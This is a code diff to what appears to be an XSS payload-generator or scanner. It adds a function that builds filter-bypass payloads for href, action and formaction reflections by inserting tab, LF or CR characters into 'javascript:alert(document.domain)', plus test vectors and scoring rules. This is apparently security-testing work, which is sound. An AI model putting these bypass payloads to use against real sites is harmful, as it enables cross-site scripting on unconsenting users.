@@ -375,6 +375,82 @@ def _jquery_payloads(context: ParsedContext) -> list[PayloadCandidate]:
     ]
 
 
+def _href_reflection_payloads(context: ParsedContext) -> list[PayloadCandidate]:
+    """Payloads for params reflected directly into href/src/action attributes.
+
+    When a value lands in href=, the browser's URL parser strips ASCII control
+    characters (tab \\x09, LF \\x0a, CR \\x0d) from the URL *before* resolving
+    the scheme.  Inserting one of these inside 'javascript:' fools naive string
+    filters while still executing in the browser.
+    """
+    import re as _re
+    from urllib.parse import quote as _quote
+
+    href_sinks = [
+        s for s in context.dom_sinks
+        if s.sink in {"reflected_in_href", "reflected_in_action", "reflected_in_formaction"}
+    ]
+    if not href_sinks:
+        return []
+
+    # Derive the affected param name from the sink source field (param='NAME')
+    param_names: list[str] = []
+    for sink in href_sinks:
+        m = _re.search(r"param='([^']+)'", sink.source)
+        if m:
+            param_names.append(m.group(1))
+    if not param_names:
+        param_names = ["url"]
+
+    # Whitespace-in-scheme variants — browser URL parser strips \x09/\x0a/\x0d
+    _WHITESPACE_VARIANTS = [
+        ("\x09", "tab (\\x09)"),
+        ("\x0a", "LF (\\x0a)"),
+        ("\x0d", "CR (\\x0d)"),
+    ]
+    payloads: list[PayloadCandidate] = []
+    target_sink = href_sinks[0].sink
+
+    for char, label in _WHITESPACE_VARIANTS:
+        raw = f"java{char}script:alert(document.domain)"
+        for param in param_names:
+            tv = f"?{param}={_quote(raw, safe='')}"
+            payloads.append(PayloadCandidate(
+                payload=raw,
+                title=f"href javascript: bypass — {label} in scheme",
+                explanation=(
+                    f"Inserts ASCII {label} inside 'javascript:' to defeat naive substring "
+                    f"filters. The HTML5 URL parser strips control chars (U+0009/000A/000D) "
+                    f"from URLs before resolving the scheme, so the browser still executes "
+                    f"'javascript:alert(document.domain)'."
+                ),
+                test_vector=tv,
+                tags=["href", "javascript-url", "whitespace-bypass", "filter-bypass", "uri"],
+                target_sink=target_sink,
+                risk_score=85,
+            ))
+
+    for char, label in _WHITESPACE_VARIANTS:
+        raw = f"{char}javascript:alert(document.domain)"
+        for param in param_names:
+            tv = f"?{param}={_quote(raw, safe='')}"
+            payloads.append(PayloadCandidate(
+                payload=raw,
+                title=f"href javascript: bypass — leading {label}",
+                explanation=(
+                    f"Prepends {label} to 'javascript:'. The HTML5 URL parser trims "
+                    f"leading control characters before resolving the scheme, bypassing "
+                    f"filters that require the value to start with 'javascript:'."
+                ),
+                test_vector=tv,
+                tags=["href", "javascript-url", "whitespace-bypass", "filter-bypass", "uri"],
+                target_sink=target_sink,
+                risk_score=80,
+            ))
+
+    return payloads
+
+
 def _event_handler_reflection_payloads(context: ParsedContext) -> list[PayloadCandidate]:
     """Payloads for params reflected directly inside event handler attributes."""
     sink_names = {s.sink for s in context.dom_sinks}
@@ -488,6 +564,7 @@ def base_payloads_for_context(context: ParsedContext) -> list[PayloadCandidate]:
     payloads.extend(_location_href_payloads(context))
     payloads.extend(_dom_source_payloads(context))
     payloads.extend(_jquery_payloads(context))
+    payloads.extend(_href_reflection_payloads(context))
     payloads.extend(_event_handler_reflection_payloads(context))
     payloads.extend(_encoded_delivery_payloads(context))
     payloads.extend(_input_payloads(context))
@@ -549,6 +626,13 @@ def score_payload(payload: PayloadCandidate, context: ParsedContext) -> int:
 
     # ── jQuery sinks ──────────────────────────────────────────────────────────
     if any("jquery" in s for s in sink_names) and any(k in text for k in ("<img", "<svg", "<iframe")):
+        score += 12
+
+    # ── Reflected href — whitespace bypass payloads ───────────────────────────
+    href_reflect = {s for s in sink_names if s in {"reflected_in_href", "reflected_in_action", "reflected_in_formaction"}}
+    if href_reflect and "whitespace-bypass" in tags:
+        score += 25
+    if href_reflect and "uri" in tags:
         score += 12
 
     # ── Reflected event handler ───────────────────────────────────────────────
